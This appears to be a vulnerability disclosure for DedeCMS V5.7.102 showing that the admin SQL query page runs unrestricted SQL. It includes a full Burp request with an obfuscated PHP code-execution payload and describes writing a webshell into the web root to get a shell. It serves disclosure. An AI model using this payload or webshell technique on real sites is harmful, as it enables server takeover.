from https://www.dedecms.com/download Download the latest version of DedeCMS V5.7.102 source code
Don't get confused with dedecmsv6. Two different manufacturers are weaving dreams
In sys_ sql_ It is found in query.php that there are no restrictions on the sql query.

![image](https://user-images.githubusercontent.com/40231393/204223553-487d5ae7-8377-43ce-983a-3fc983314af1.png)
![image](https://user-images.githubusercontent.com/40231393/204223568-14b16d67-dec3-4292-bada-6c6753824206.png)

Burp packets:

POST /dede/sys_ sql_ query. php HTTP/1.1
Host: 192.168.31.232
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml; q=0.9,image/webp,*/*; q=0.8
Accept-Language: zh-CN,zh; q=0.8,zh-TW; q=0.7,zh-HK; q=0.5,en-US; q=0.3,en; q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 269
Origin: http://192.168.31.232
Connection: close
Referer: http://192.168.31.232/dede/sys_sql_query.php
Cookie: menuitems=1_ 1%2C2_ 1%2C3_ 1; csrf_ 6cfde2=adc35bfd; PHPSESSID=3oo71kvibfrf6dabg9e4cjkq25; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=98e4e178bbc280ad; DedeLoginTime=1669558059; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=7bf516f891bb262f; _ csrf_ name_ df9cb7dd=fb0e24f4883f49ba392d80998ccc0d54; _ csrf_ name_ df9cb7dd1BH21ANI1AGD297L1FF21LN02BGE1DNG=857c43fa30ee8e38
Upgrade-Insecure-Requests: 1

token=48d602cf201359de513ab6f4976f00a5&dopost=query&querytype=2&sqlquery=select+%3C%3Fphp+%24x%3D%27sys%27%3B%24xx%3D%27tem%27%3B%24xxx%3D%24x.%24xx%3B%24y%3D%27ca%27%3B%24yy%3D%27lc%27%3B%24yyy%3D%24y.%24yy%3B%24xxx%28%24yyy%29+%3F%3E%3B&imageField.x=36&imageField.y=2


When you throw it into the sqlmap, you can see that it is the dba permission. Because my directory is changed by myself, it is not the default directory.

![image](https://user-images.githubusercontent.com/40231393/204223614-dda30490-ad69-4d88-82c7-8878bc3b0ee7.png)

Manual query:

![image](https://user-images.githubusercontent.com/40231393/204223644-f206403f-8b6d-4e58-9893-e1631e2eb21b.png)

Get the root directory of the website according to the results, and use the root directory to write the horse. Although the writing is no return results, it is written in, and the shell is successfully obtained

![image](https://user-images.githubusercontent.com/40231393/204223675-7be29947-2ca1-4b74-b55b-0508672320f5.png)
![image](https://user-images.githubusercontent.com/40231393/204223696-8370b01b-86c4-4f52-b34d-615f154dd124.png)
![image](https://user-images.githubusercontent.com/40231393/204223731-1c9e67f2-6f62-4894-bd72-df6ded19d4a0.png)
